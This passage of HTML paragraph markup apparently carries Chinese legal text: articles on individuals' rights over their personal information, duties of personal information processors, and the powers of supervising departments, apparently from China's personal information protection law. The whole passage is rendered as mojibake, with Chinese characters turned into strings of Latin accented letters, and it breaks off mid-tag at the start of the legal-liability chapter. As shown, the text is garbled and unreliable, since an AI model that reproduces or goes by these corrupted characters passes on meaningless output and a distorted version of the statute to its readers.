2em;">ä¸ªäººè¯·æ±‚æŸ¥é˜…ã€å¤åˆ¶å…¶ä¸ªäººä¿¡æ¯çš„ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“åŠæ—¶æä¾›ã€‚</p><p style="text-indent: 2em;">ä¸ªäººè¯·æ±‚å°†ä¸ªäººä¿¡æ¯è½¬ç§»è‡³å…¶æŒ‡å®šçš„ä¸ªäººä¿¡æ¯å¤„ç†è€…ï¼Œç¬¦åˆå›½å®¶ç½‘ä¿¡éƒ¨é—¨è§„å®šæ¡ä»¶çš„ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“æä¾›è½¬ç§»çš„é€”å¾„ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åå…­æ¡</span>ã€€ä¸ªäººå‘ç°å…¶ä¸ªäººä¿¡æ¯ä¸å‡†ç¡®æˆ–è€…ä¸å®Œæ•´çš„ï¼Œæœ‰æƒè¯·æ±‚ä¸ªäººä¿¡æ¯å¤„ç†è€…æ›´æ­£ã€è¡¥å……ã€‚</p><p style="text-indent: 2em;">ä¸ªäººè¯·æ±‚æ›´æ­£ã€è¡¥å……å…¶ä¸ªäººä¿¡æ¯çš„ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“å¯¹å…¶ä¸ªäººä¿¡æ¯äºˆä»¥æ ¸å®ï¼Œå¹¶åŠæ—¶æ›´æ­£ã€è¡¥å……ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åä¸ƒæ¡</span>ã€€æœ‰ä¸‹åˆ—æƒ…å½¢ä¹‹ä¸€çš„ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“ä¸»åŠ¨åˆ é™¤ä¸ªäººä¿¡æ¯ï¼›ä¸ªäººä¿¡æ¯å¤„ç†è€…æœªåˆ é™¤çš„ï¼Œä¸ªäººæœ‰æƒè¯·æ±‚åˆ é™¤ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰å¤„ç†ç›®çš„å·²å®ç°ã€æ— æ³•å®ç°æˆ–è€…ä¸ºå®ç°å¤„ç†ç›®çš„ä¸å†å¿…è¦ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰ä¸ªäººä¿¡æ¯å¤„ç†è€…åœæ­¢æä¾›äº§å“æˆ–è€…æœåŠ¡ï¼Œæˆ–è€…ä¿å­˜æœŸé™å·²å±Šæ»¡ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰ä¸ªäººæ’¤å›åŒæ„ï¼›</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰ä¸ªäººä¿¡æ¯å¤„ç†è€…è¿åæ³•å¾‹ã€è¡Œæ”¿æ³•è§„æˆ–è€…è¿åçº¦å®šå¤„ç†ä¸ªäººä¿¡æ¯ï¼›</p><p style="text-indent: 2em;">ï¼ˆäº”ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„å…¶ä»–æƒ…å½¢ã€‚</p><p style="text-indent: 2em;">æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„ä¿å­˜æœŸé™æœªå±Šæ»¡ï¼Œæˆ–è€…åˆ é™¤ä¸ªäººä¿¡æ¯ä»æŠ€æœ¯ä¸Šéš¾ä»¥å®ç°çš„ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“åœæ­¢é™¤å­˜å‚¨å’Œé‡‡å–å¿…è¦çš„å®‰å…¨ä¿æŠ¤æªæ–½ä¹‹å¤–çš„å¤„ç†ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åå…«æ¡</span>ã€€ä¸ªäººæœ‰æƒè¦æ±‚ä¸ªäººä¿¡æ¯å¤„ç†è€…å¯¹å…¶ä¸ªäººä¿¡æ¯å¤„ç†è§„åˆ™è¿›è¡Œè§£é‡Šè¯´æ˜ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å››åä¹æ¡</span>ã€€è‡ªç„¶äººæ­»äº¡çš„ï¼Œå…¶è¿‘äº²å±ä¸ºäº†è‡ªèº«çš„åˆæ³•ã€æ­£å½“åˆ©ç›Šï¼Œå¯ä»¥å¯¹æ­»è€…çš„ç›¸å…³ä¸ªäººä¿¡æ¯è¡Œä½¿æœ¬ç« è§„å®šçš„æŸ¥é˜…ã€å¤åˆ¶ã€æ›´æ­£ã€åˆ é™¤ç­‰æƒåˆ©ï¼›æ­»è€…ç”Ÿå‰å¦æœ‰å®‰æ’çš„é™¤å¤–ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åæ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“å»ºç«‹ä¾¿æ·çš„ä¸ªäººè¡Œä½¿æƒåˆ©çš„ç”³è¯·å—ç†å’Œå¤„ç†æœºåˆ¶ã€‚æ‹’ç»ä¸ªäººè¡Œä½¿æƒåˆ©çš„è¯·æ±‚çš„ï¼Œåº”å½“è¯´æ˜ç†ç”±ã€‚</p><p style="text-indent: 2em;">ä¸ªäººä¿¡æ¯å¤„ç†è€…æ‹’ç»ä¸ªäººè¡Œä½¿æƒåˆ©çš„è¯·æ±‚çš„ï¼Œä¸ªäººå¯ä»¥ä¾æ³•å‘äººæ°‘æ³•é™¢æèµ·è¯‰è®¼ã€‚</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬äº”ç« ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…çš„ä¹‰åŠ¡</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åä¸€æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“æ ¹æ®ä¸ªäººä¿¡æ¯çš„å¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼ã€ä¸ªäººä¿¡æ¯çš„ç§ç±»ä»¥åŠå¯¹ä¸ªäººæƒç›Šçš„å½±å“ã€å¯èƒ½å­˜åœ¨çš„å®‰å…¨é£é™©ç­‰ï¼Œé‡‡å–ä¸‹åˆ—æªæ–½ç¡®ä¿ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨ç¬¦åˆæ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šï¼Œå¹¶é˜²æ­¢æœªç»æˆæƒçš„è®¿é—®ä»¥åŠä¸ªäººä¿¡æ¯æ³„éœ²ã€ç¯¡æ”¹ã€ä¸¢å¤±ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰åˆ¶å®šå†…éƒ¨ç®¡ç†åˆ¶åº¦å’Œæ“ä½œè§„ç¨‹ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰å¯¹ä¸ªäººä¿¡æ¯å®è¡Œåˆ†ç±»ç®¡ç†ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰é‡‡å–ç›¸åº”çš„åŠ å¯†ã€å»æ ‡è¯†åŒ–ç­‰å®‰å…¨æŠ€æœ¯æªæ–½ï¼›</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰åˆç†ç¡®å®šä¸ªäººä¿¡æ¯å¤„ç†çš„æ“ä½œæƒé™ï¼Œå¹¶å®šæœŸå¯¹ä»ä¸šäººå‘˜è¿›è¡Œå®‰å…¨æ•™è‚²å’ŒåŸ¹è®­ï¼›</p><p style="text-indent: 2em;">ï¼ˆäº”ï¼‰åˆ¶å®šå¹¶ç»„ç»‡å®æ–½ä¸ªäººä¿¡æ¯å®‰å…¨äº‹ä»¶åº”æ€¥é¢„æ¡ˆï¼›</p><p style="text-indent: 2em;">ï¼ˆå…­ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„å…¶ä»–æªæ–½ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åäºŒæ¡</span>ã€€å¤„ç†ä¸ªäººä¿¡æ¯è¾¾åˆ°å›½å®¶ç½‘ä¿¡éƒ¨é—¨è§„å®šæ•°é‡çš„ä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“æŒ‡å®šä¸ªäººä¿¡æ¯ä¿æŠ¤è´Ÿè´£äººï¼Œè´Ÿè´£å¯¹ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨ä»¥åŠé‡‡å–çš„ä¿æŠ¤æªæ–½ç­‰è¿›è¡Œç›‘ç£ã€‚</p><p style="text-indent: 2em;">ä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“å…¬å¼€ä¸ªäººä¿¡æ¯ä¿æŠ¤è´Ÿè´£äººçš„è”ç³»æ–¹å¼ï¼Œå¹¶å°†ä¸ªäººä¿¡æ¯ä¿æŠ¤è´Ÿè´£äººçš„å§“åã€è”ç³»æ–¹å¼ç­‰æŠ¥é€å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åä¸‰æ¡</span>ã€€æœ¬æ³•ç¬¬ä¸‰æ¡ç¬¬äºŒæ¬¾è§„å®šçš„ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå¤–çš„ä¸ªäººä¿¡æ¯å¤„ç†è€…ï¼Œåº”å½“åœ¨ä¸­åäººæ°‘å…±å’Œå›½å¢ƒå†…è®¾ç«‹ä¸“é—¨æœºæ„æˆ–è€…æŒ‡å®šä»£è¡¨ï¼Œè´Ÿè´£å¤„ç†ä¸ªäººä¿¡æ¯ä¿æŠ¤ç›¸å…³äº‹åŠ¡ï¼Œå¹¶å°†æœ‰å…³æœºæ„çš„åç§°æˆ–è€…ä»£è¡¨çš„å§“åã€è”ç³»æ–¹å¼ç­‰æŠ¥é€å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åå››æ¡</span>ã€€ä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“å®šæœŸå¯¹å…¶å¤„ç†ä¸ªäººä¿¡æ¯éµå®ˆæ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„æƒ…å†µè¿›è¡Œåˆè§„å®¡è®¡ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åäº”æ¡</span>ã€€æœ‰ä¸‹åˆ—æƒ…å½¢ä¹‹ä¸€çš„ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“äº‹å‰è¿›è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤å½±å“è¯„ä¼°ï¼Œå¹¶å¯¹å¤„ç†æƒ…å†µè¿›è¡Œè®°å½•ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰å¤„ç†æ•æ„Ÿä¸ªäººä¿¡æ¯ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰åˆ©ç”¨ä¸ªäººä¿¡æ¯è¿›è¡Œè‡ªåŠ¨åŒ–å†³ç­–ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰å§”æ‰˜å¤„ç†ä¸ªäººä¿¡æ¯ã€å‘å…¶ä»–ä¸ªäººä¿¡æ¯å¤„ç†è€…æä¾›ä¸ªäººä¿¡æ¯ã€å…¬å¼€ä¸ªäººä¿¡æ¯ï¼›</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰å‘å¢ƒå¤–æä¾›ä¸ªäººä¿¡æ¯ï¼›</p><p style="text-indent: 2em;">ï¼ˆäº”ï¼‰å…¶ä»–å¯¹ä¸ªäººæƒç›Šæœ‰é‡å¤§å½±å“çš„ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åå…­æ¡</span>ã€€ä¸ªäººä¿¡æ¯ä¿æŠ¤å½±å“è¯„ä¼°åº”å½“åŒ…æ‹¬ä¸‹åˆ—å†…å®¹ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰ä¸ªäººä¿¡æ¯çš„å¤„ç†ç›®çš„ã€å¤„ç†æ–¹å¼ç­‰æ˜¯å¦åˆæ³•ã€æ­£å½“ã€å¿…è¦ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰å¯¹ä¸ªäººæƒç›Šçš„å½±å“åŠå®‰å…¨é£é™©ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰æ‰€é‡‡å–çš„ä¿æŠ¤æªæ–½æ˜¯å¦åˆæ³•ã€æœ‰æ•ˆå¹¶ä¸é£é™©ç¨‹åº¦ç›¸é€‚åº”ã€‚</p><p style="text-indent: 2em;">ä¸ªäººä¿¡æ¯ä¿æŠ¤å½±å“è¯„ä¼°æŠ¥å‘Šå’Œå¤„ç†æƒ…å†µè®°å½•åº”å½“è‡³å°‘ä¿å­˜ä¸‰å¹´ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åä¸ƒæ¡</span>ã€€å‘ç”Ÿæˆ–è€…å¯èƒ½å‘ç”Ÿä¸ªäººä¿¡æ¯æ³„éœ²ã€ç¯¡æ”¹ã€ä¸¢å¤±çš„ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“ç«‹å³é‡‡å–è¡¥æ•‘æªæ–½ï¼Œå¹¶é€šçŸ¥å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨å’Œä¸ªäººã€‚é€šçŸ¥åº”å½“åŒ…æ‹¬ä¸‹åˆ—äº‹é¡¹ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰å‘ç”Ÿæˆ–è€…å¯èƒ½å‘ç”Ÿä¸ªäººä¿¡æ¯æ³„éœ²ã€ç¯¡æ”¹ã€ä¸¢å¤±çš„ä¿¡æ¯ç§ç±»ã€åŸå› å’Œå¯èƒ½é€ æˆçš„å±å®³ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰ä¸ªäººä¿¡æ¯å¤„ç†è€…é‡‡å–çš„è¡¥æ•‘æªæ–½å’Œä¸ªäººå¯ä»¥é‡‡å–çš„å‡è½»å±å®³çš„æªæ–½ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰ä¸ªäººä¿¡æ¯å¤„ç†è€…çš„è”ç³»æ–¹å¼ã€‚</p><p style="text-indent: 2em;">ä¸ªäººä¿¡æ¯å¤„ç†è€…é‡‡å–æªæ–½èƒ½å¤Ÿæœ‰æ•ˆé¿å…ä¿¡æ¯æ³„éœ²ã€ç¯¡æ”¹ã€ä¸¢å¤±é€ æˆå±å®³çš„ï¼Œä¸ªäººä¿¡æ¯å¤„ç†è€…å¯ä»¥ä¸é€šçŸ¥ä¸ªäººï¼›å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨è®¤ä¸ºå¯èƒ½é€ æˆå±å®³çš„ï¼Œæœ‰æƒè¦æ±‚ä¸ªäººä¿¡æ¯å¤„ç†è€…é€šçŸ¥ä¸ªäººã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åå…«æ¡</span>ã€€æä¾›é‡è¦äº’è”ç½‘å¹³å°æœåŠ¡ã€ç”¨æˆ·æ•°é‡å·¨å¤§ã€ä¸šåŠ¡ç±»å‹å¤æ‚çš„ä¸ªäººä¿¡æ¯å¤„ç†è€…ï¼Œåº”å½“å±¥è¡Œä¸‹åˆ—ä¹‰åŠ¡ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰æŒ‰ç…§å›½å®¶è§„å®šå»ºç«‹å¥å…¨ä¸ªäººä¿¡æ¯ä¿æŠ¤åˆè§„åˆ¶åº¦ä½“ç³»ï¼Œæˆç«‹ä¸»è¦ç”±å¤–éƒ¨æˆå‘˜ç»„æˆçš„ç‹¬ç«‹æœºæ„å¯¹ä¸ªäººä¿¡æ¯ä¿æŠ¤æƒ…å†µè¿›è¡Œç›‘ç£ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰éµå¾ªå…¬å¼€ã€å…¬å¹³ã€å…¬æ­£çš„åŸåˆ™ï¼Œåˆ¶å®šå¹³å°è§„åˆ™ï¼Œæ˜ç¡®å¹³å°å†…äº§å“æˆ–è€…æœåŠ¡æä¾›è€…å¤„ç†ä¸ªäººä¿¡æ¯çš„è§„èŒƒå’Œä¿æŠ¤ä¸ªäººä¿¡æ¯çš„ä¹‰åŠ¡ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰å¯¹ä¸¥é‡è¿åæ³•å¾‹ã€è¡Œæ”¿æ³•è§„å¤„ç†ä¸ªäººä¿¡æ¯çš„å¹³å°å†…çš„äº§å“æˆ–è€…æœåŠ¡æä¾›è€…ï¼Œåœæ­¢æä¾›æœåŠ¡ï¼›</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰å®šæœŸå‘å¸ƒä¸ªäººä¿¡æ¯ä¿æŠ¤ç¤¾ä¼šè´£ä»»æŠ¥å‘Šï¼Œæ¥å—ç¤¾ä¼šç›‘ç£ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬äº”åä¹æ¡</span>ã€€æ¥å—å§”æ‰˜å¤„ç†ä¸ªäººä¿¡æ¯çš„å—æ‰˜äººï¼Œåº”å½“ä¾ç…§æœ¬æ³•å’Œæœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šï¼Œé‡‡å–å¿…è¦æªæ–½ä¿éšœæ‰€å¤„ç†çš„ä¸ªäººä¿¡æ¯çš„å®‰å…¨ï¼Œå¹¶ååŠ©ä¸ªäººä¿¡æ¯å¤„ç†è€…å±¥è¡Œæœ¬æ³•è§„å®šçš„ä¹‰åŠ¡ã€‚</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬å…­ç« ã€€å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨</span></p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­åæ¡</span>ã€€å›½å®¶ç½‘ä¿¡éƒ¨é—¨è´Ÿè´£ç»Ÿç­¹åè°ƒä¸ªäººä¿¡æ¯ä¿æŠ¤å·¥ä½œå’Œç›¸å…³ç›‘ç£ç®¡ç†å·¥ä½œã€‚å›½åŠ¡é™¢æœ‰å…³éƒ¨é—¨ä¾ç…§æœ¬æ³•å’Œæœ‰å…³æ³•å¾‹ã€è¡Œæ”¿æ³•è§„çš„è§„å®šï¼Œåœ¨å„è‡ªèŒè´£èŒƒå›´å†…è´Ÿè´£ä¸ªäººä¿¡æ¯ä¿æŠ¤å’Œç›‘ç£ç®¡ç†å·¥ä½œã€‚</p><p style="text-indent: 2em;">å¿çº§ä»¥ä¸Šåœ°æ–¹äººæ°‘æ”¿åºœæœ‰å…³éƒ¨é—¨çš„ä¸ªäººä¿¡æ¯ä¿æŠ¤å’Œç›‘ç£ç®¡ç†èŒè´£ï¼ŒæŒ‰ç…§å›½å®¶æœ‰å…³è§„å®šç¡®å®šã€‚</p><p style="text-indent: 2em;">å‰ä¸¤æ¬¾è§„å®šçš„éƒ¨é—¨ç»Ÿç§°ä¸ºå±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­åä¸€æ¡</span>ã€€å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨å±¥è¡Œä¸‹åˆ—ä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰å¼€å±•ä¸ªäººä¿¡æ¯ä¿æŠ¤å®£ä¼ æ•™è‚²ï¼ŒæŒ‡å¯¼ã€ç›‘ç£ä¸ªäººä¿¡æ¯å¤„ç†è€…å¼€å±•ä¸ªäººä¿¡æ¯ä¿æŠ¤å·¥ä½œï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰æ¥å—ã€å¤„ç†ä¸ä¸ªäººä¿¡æ¯ä¿æŠ¤æœ‰å…³çš„æŠ•è¯‰ã€ä¸¾æŠ¥ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰ç»„ç»‡å¯¹åº”ç”¨ç¨‹åºç­‰ä¸ªäººä¿¡æ¯ä¿æŠ¤æƒ…å†µè¿›è¡Œæµ‹è¯„ï¼Œå¹¶å…¬å¸ƒæµ‹è¯„ç»“æœï¼›</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰è°ƒæŸ¥ã€å¤„ç†è¿æ³•ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨ï¼›</p><p style="text-indent: 2em;">ï¼ˆäº”ï¼‰æ³•å¾‹ã€è¡Œæ”¿æ³•è§„è§„å®šçš„å…¶ä»–èŒè´£ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­åäºŒæ¡</span>ã€€å›½å®¶ç½‘ä¿¡éƒ¨é—¨ç»Ÿç­¹åè°ƒæœ‰å…³éƒ¨é—¨ä¾æ®æœ¬æ³•æ¨è¿›ä¸‹åˆ—ä¸ªäººä¿¡æ¯ä¿æŠ¤å·¥ä½œï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰åˆ¶å®šä¸ªäººä¿¡æ¯ä¿æŠ¤å…·ä½“è§„åˆ™ã€æ ‡å‡†ï¼›</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰é’ˆå¯¹å°å‹ä¸ªäººä¿¡æ¯å¤„ç†è€…ã€å¤„ç†æ•æ„Ÿä¸ªäººä¿¡æ¯ä»¥åŠäººè„¸è¯†åˆ«ã€äººå·¥æ™ºèƒ½ç­‰æ–°æŠ€æœ¯ã€æ–°åº”ç”¨ï¼Œåˆ¶å®šä¸“é—¨çš„ä¸ªäººä¿¡æ¯ä¿æŠ¤è§„åˆ™ã€æ ‡å‡†ï¼›</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰æ”¯æŒç ”ç©¶å¼€å‘å’Œæ¨å¹¿åº”ç”¨å®‰å…¨ã€æ–¹ä¾¿çš„ç”µå­èº«ä»½è®¤è¯æŠ€æœ¯ï¼Œæ¨è¿›ç½‘ç»œèº«ä»½è®¤è¯å…¬å…±æœåŠ¡å»ºè®¾ï¼›</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰æ¨è¿›ä¸ªäººä¿¡æ¯ä¿æŠ¤ç¤¾ä¼šåŒ–æœåŠ¡ä½“ç³»å»ºè®¾ï¼Œæ”¯æŒæœ‰å…³æœºæ„å¼€å±•ä¸ªäººä¿¡æ¯ä¿æŠ¤è¯„ä¼°ã€è®¤è¯æœåŠ¡ï¼›</p><p style="text-indent: 2em;">ï¼ˆäº”ï¼‰å®Œå–„ä¸ªäººä¿¡æ¯ä¿æŠ¤æŠ•è¯‰ã€ä¸¾æŠ¥å·¥ä½œæœºåˆ¶ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­åä¸‰æ¡</span>ã€€å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£ï¼Œå¯ä»¥é‡‡å–ä¸‹åˆ—æªæ–½ï¼š</p><p style="text-indent: 2em;">ï¼ˆä¸€ï¼‰è¯¢é—®æœ‰å…³å½“äº‹äººï¼Œè°ƒæŸ¥ä¸ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨æœ‰å…³çš„æƒ…å†µ;</p><p style="text-indent: 2em;">ï¼ˆäºŒï¼‰æŸ¥é˜…ã€å¤åˆ¶å½“äº‹äººä¸ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨æœ‰å…³çš„åˆåŒã€è®°å½•ã€è´¦ç°¿ä»¥åŠå…¶ä»–æœ‰å…³èµ„æ–™;</p><p style="text-indent: 2em;">ï¼ˆä¸‰ï¼‰å®æ–½ç°åœºæ£€æŸ¥ï¼Œå¯¹æ¶‰å«Œè¿æ³•çš„ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨è¿›è¡Œè°ƒæŸ¥;</p><p style="text-indent: 2em;">ï¼ˆå››ï¼‰æ£€æŸ¥ä¸ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨æœ‰å…³çš„è®¾å¤‡ã€ç‰©å“;å¯¹æœ‰è¯æ®è¯æ˜æ˜¯ç”¨äºè¿æ³•ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨çš„è®¾å¤‡ã€ç‰©å“ï¼Œå‘æœ¬éƒ¨é—¨ä¸»è¦è´Ÿè´£äººä¹¦é¢æŠ¥å‘Šå¹¶ç»æ‰¹å‡†ï¼Œå¯ä»¥æŸ¥å°æˆ–è€…æ‰£æŠ¼ã€‚</p><p style="text-indent: 2em;">å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨ä¾æ³•å±¥è¡ŒèŒè´£ï¼Œå½“äº‹äººåº”å½“äºˆä»¥ååŠ©ã€é…åˆï¼Œä¸å¾—æ‹’ç»ã€é˜»æŒ ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­åå››æ¡</span>ã€€å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨åœ¨å±¥è¡ŒèŒè´£ä¸­ï¼Œå‘ç°ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨å­˜åœ¨è¾ƒå¤§é£é™©æˆ–è€…å‘ç”Ÿä¸ªäººä¿¡æ¯å®‰å…¨äº‹ä»¶çš„ï¼Œå¯ä»¥æŒ‰ç…§è§„å®šçš„æƒé™å’Œç¨‹åºå¯¹è¯¥ä¸ªäººä¿¡æ¯å¤„ç†è€…çš„æ³•å®šä»£è¡¨äººæˆ–è€…ä¸»è¦è´Ÿè´£äººè¿›è¡Œçº¦è°ˆï¼Œæˆ–è€…è¦æ±‚ä¸ªäººä¿¡æ¯å¤„ç†è€…å§”æ‰˜ä¸“ä¸šæœºæ„å¯¹å…¶ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨è¿›è¡Œåˆè§„å®¡è®¡ã€‚ä¸ªäººä¿¡æ¯å¤„ç†è€…åº”å½“æŒ‰ç…§è¦æ±‚é‡‡å–æªæ–½ï¼Œè¿›è¡Œæ•´æ”¹ï¼Œæ¶ˆé™¤éšæ‚£ã€‚</p><p style="text-indent: 2em;">å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨åœ¨å±¥è¡ŒèŒè´£ä¸­ï¼Œå‘ç°è¿æ³•å¤„ç†ä¸ªäººä¿¡æ¯æ¶‰å«ŒçŠ¯ç½ªçš„ï¼Œåº”å½“åŠæ—¶ç§»é€å…¬å®‰æœºå…³ä¾æ³•å¤„ç†ã€‚</p><p style="text-indent: 2em;"><span style="font-family: é»‘ä½“;">ç¬¬å…­åäº”æ¡</span>ã€€ä»»ä½•ç»„ç»‡ã€ä¸ªäººæœ‰æƒå¯¹è¿æ³•ä¸ªäººä¿¡æ¯å¤„ç†æ´»åŠ¨å‘å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨è¿›è¡ŒæŠ•è¯‰ã€ä¸¾æŠ¥ã€‚æ”¶åˆ°æŠ•è¯‰ã€ä¸¾æŠ¥çš„éƒ¨é—¨åº”å½“ä¾æ³•åŠæ—¶å¤„ç†ï¼Œå¹¶å°†å¤„ç†ç»“æœå‘ŠçŸ¥æŠ•è¯‰ã€ä¸¾æŠ¥äººã€‚</p><p style="text-indent: 2em;">å±¥è¡Œä¸ªäººä¿¡æ¯ä¿æŠ¤èŒè´£çš„éƒ¨é—¨åº”å½“å…¬å¸ƒæ¥å—æŠ•è¯‰ã€ä¸¾æŠ¥çš„è”ç³»æ–¹å¼ã€‚</p><p style="text-indent: 2em;"><br></p><p style="text-align: center;"><span style="font-family: é»‘ä½“;">ç¬¬ä¸ƒç« ã€€æ³•å¾‹è´£ä»»</span></p><p style="text-indent: 2em;"><span style="font-family: 